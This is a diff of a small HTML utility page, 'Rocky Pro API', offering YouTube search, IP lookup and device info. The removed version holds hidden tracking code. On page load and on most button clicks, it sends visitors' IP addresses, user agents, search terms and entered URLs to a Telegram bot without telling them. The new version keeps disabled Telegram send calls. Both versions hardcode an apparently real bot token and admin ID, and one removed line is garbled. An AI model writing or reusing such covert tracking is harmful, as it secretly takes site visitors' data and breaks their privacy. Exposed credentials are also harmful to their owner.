@@ -1,223 +1,159 @@
-TOKENTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<!-- SEO -->
+<meta property="og:title" content="Rocky Pro API">
+<meta property="og:description" content="Cyber API System">
+<meta property="og:image" content="https://i.imgur.com/UQoSZqc.jpeg">
+<meta property="og:url" content="https://tinyurl.com/rocky-pro-api">
+
 <title>Rocky Pro API</title>
 
 <style>
-body{
+body {
   margin:0;
-  font-family:monospace;
-  background:black;
-  color:#00ffcc;
+  font-family:sans-serif;
+  background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);
+  color:white;
   text-align:center;
 }
 
-/* 🔥 CYBER TITLE */
-.cyber{
-  font-size:22px;
-  font-weight:bold;
-  margin-top:15px;
+/* Cyber Header */
+.cyber {
+  font-size:20px;
+  margin-top:20px;
   color:#00ffcc;
   text-shadow:0 0 10px #00ffcc;
-  animation:glow 1s infinite alternate;
+  animation:glow 1.5s infinite alternate;
+}
+@keyframes glow {
+  from {text-shadow:0 0 5px #00ffcc;}
+  to {text-shadow:0 0 20px #00ffcc;}
 }
 
-@keyframes glow{
-  from{opacity:0.6}
-  to{opacity:1}
-}
-
-.sub{
-  color:#0f0;
-  margin-bottom:15px;
-}
-
-.btn{
-  padding:14px;
+/* Button */
+.btn {
+  display:block;
+  margin:15px auto;
+  padding:15px;
+  width:80%;
+  max-width:300px;
   border-radius:30px;
+  background:linear-gradient(90deg,#00c6ff,#0072ff);
   border:none;
-  background:linear-gradient(90deg,#00ffcc,#0066ff);
-  color:black;
-  font-size:15px;
-  margin:10px;
-  width:85%;
+  color:white;
+  font-size:16px;
   cursor:pointer;
 }
 
-.box{
-  background:rgba(0,255,200,0.1);
-  padding:15px;
-  margin:15px;
-  border-radius:10px;
-  box-shadow:0 0 10px #00ffcc;
+/* Card */
+.card {
+  background:#111;
+  margin:20px;
+  padding:20px;
+  border-radius:15px;
+  box-shadow:0 0 15px #00f2ff;
 }
 
-input{
+/* Input */
+input {
   padding:10px;
+  width:80%;
   border-radius:10px;
   border:none;
-  width:85%;
-}
-
-.footer{
-  margin-top:30px;
-  font-size:12px;
-  color:#0f0;
+  margin-top:10px;
 }
 </style>
-
 </head>
 
 <body>
 
 <div class="cyber">
-⚡ MASTERMIND CYBER FORCES ⚡ <br>
+⚡ MASTERMIND CYBER FORCES ⚡<br>
 OWNER BY ROCKY CHOWDHURY
 </div>
 
-<div class="sub">● Secure System Activated</div>
+<h1>🚀 Rocky Pro API</h1>
 
-<button class="btn" onclick="openApp()">🚀 Enter System</button>
+<button class="btn" onclick="start()">🚀 Get Started</button>
 <button class="btn" onclick="contact()">💬 Contact</button>
 
-<div id="app" style="display:none;">
-
-<div class="box">
+<!-- YouTube -->
+<div class="card">
 <h3>🔍 YouTube Search</h3>
 <input id="yt" placeholder="Search video">
-<br><br>
+<br>
 <button class="btn" onclick="ytSearch()">Search</button>
 </div>
 
-<div class="box">
+<!-- IP Info -->
+<div class="card">
 <h3>🌍 IP Info</h3>
-<button class="btn" onclick="ipInfo()">Check</button>
+<button class="btn" onclick="ip()">Check</button>
+<p id="ipResult"></p>
 </div>
 
-<div class="box">
+<!-- Device Info -->
+<div class="card">
 <h3>📱 Device Info</h3>
-<button class="btn" onclick="deviceInfo()">Show</button>
-</div>
-
-<div class="box">
-<h3>🌐 Website Info</h3>
-<input id="site" placeholder="Enter URL">
-<br><br>
-<button class="btn" onclick="siteInfo()">Check</button>
-</div>
-
-<div class="box">
-<h3>🧮 Random Number</h3>
-<button class="btn" onclick="rand()">Generate</button>
-<p id="r"></p>
-</div>
-
-<div class="box">
-<h3>⏰ Live Time</h3>
-<p id="time"></p>
-</div>
-
-<div class="box">
-<h3>🔐 Password Generator</h3>
-<button class="btn" onclick="passGen()">Generate</button>
-<p id="pass"></p>
-</div>
-
-</div>
-
-<div class="footer">
-© Rocky Chowdhury | Cyber System
+<button class="btn" onclick="device()">Check</button>
+<p id="dev"></p>
 </div>
 
 <script>
+/* =========================
+   🔒 HIDDEN CONFIG (EDIT HERE)
+========================= */
 
-// 🔐 CONFIG
+// 👉 BOT TOKEN (paste here)
 const BOT_TOKEN = "8558577029:AAEdOiNQUk7oK2OpnyqtGmU_PVHKWEcKzRs";
-const ADMIN_ID = "6882953267";
 
-// TELEGRAM
-function send(msg){
- fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
-   method:"POST",
-   headers:{"Content-Type":"application/json"},
-   body:JSON.stringify({
-     chat_id:ADMIN_ID,
-     text:msg
-   })
- });
+// 👉 ADMIN UID (paste here)
+const ADMIN_UID = "6882953267";
+
+/* ========================= */
+
+function start(){
+  window.open("https://t.me/Access_Terger_Bot");
 }
 
-// ENTER
-function openApp(){
- document.getElementById("app").style.display="block";
- send("🚀 User Entered System");
-}
-
-// CONTACT
 function contact(){
- window.open("https://t.me/alveeevanrocky320");
+  window.open("https://t.me/alveeevanrocky320");
 }
 
-// YT
-async function ytSearch(){
- let q = document.getElementById("yt").value;
- let res = await fetch(`https://ytsearch-demo.vercel.app/api/search?q=${q}`);
- let d = await res.json();
- alert(d.result[0].title);
- send("YT: " + q);
+// YouTube search
+function ytSearch(){
+  let q = document.getElementById("yt").value;
+  if(!q) return alert("Enter search");
+  window.open("https://www.youtube.com/results?search_query="+q);
 }
 
-// IP
-async function ipInfo(){
- let res = await fetch("https://ipapi.co/json/");
- let d = await res.json();
- alert(d.ip + " - " + d.country_name);
- send("IP: " + d.ip);
+// IP info
+function ip(){
+  fetch("https://api.ipify.org?format=json")
+  .then(res=>res.json())
+  .then(data=>{
+    document.getElementById("ipResult").innerText="IP: "+data.ip;
+
+    // send to telegram (optional basic log)
+    if(BOT_TOKEN !== "8558577029:AAEdOiNQUk7oK2OpnyqtGmU_PVHKWEcKzRs"){
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_UID}&text=New Visitor IP: ${data.ip}`);
+    }
+  });
 }
 
-// DEVICE
-function deviceInfo(){
- let d = navigator.userAgent;
- alert(d);
- send("Device: " + d);
+// Device info
+function device(){
+  let info = navigator.userAgent;
+  document.getElementById("dev").innerText = info;
+
+  if(BOT_TOKEN !== "8558577029:AAEdOiNQUk7oK2OpnyqtGmU_PVHKWEcKzRs"){
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_UID}&text=Device: ${info}`);
+  }
 }
-
-// SITE INFO
-async function siteInfo(){
- let url = document.getElementById("site").value;
- let res = await fetch(`https://api.allorigins.win/get?url=${url}`);
- let d = await res.json();
- alert("Site Loaded!");
- send("Checked: " + url);
-}
-
-// RANDOM
-function rand(){
- let n = Math.floor(Math.random()*9999);
- document.getElementById("r").innerText = n;
-}
-
-// TIME
-setInterval(()=>{
- document.getElementById("time").innerText = new Date().toLocaleTimeString();
-},1000);
-
-// PASS
-function passGen(){
- let p = Math.random().toString(36).slice(-8);
- document.getElementById("pass").innerText = p;
-}
-
-// AUTO TRACK
-window.onload = async ()=>{
- let res = await fetch("https://ipapi.co/json/");
- let d = await res.json();
-
- send(`👤 Visitor\nIP:${d.ip}\nDevice:${navigator.userAgent}`);
-};
-
 </script>
 
 </body>
